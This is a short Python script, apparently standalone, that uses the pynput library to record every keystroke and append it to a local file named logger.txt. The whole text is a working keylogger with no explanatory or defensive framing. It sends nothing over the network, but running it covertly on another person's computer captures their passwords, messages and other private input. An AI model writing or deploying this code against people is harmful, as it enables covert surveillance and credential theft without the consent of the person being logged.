#!/usr/bin/python3

from pynput.keyboard import Listener

def keylogger(key):
    key = str(key)
    key = key.replace("'","")
    if key == 'Key.space':
        key = ' '
    if key == "Key.enter":
        key = '\n'    

    with open("logger.txt", 'a') as f:
        f.write(key)

with Listener(on_press=keylogger) as x:
    x.join()

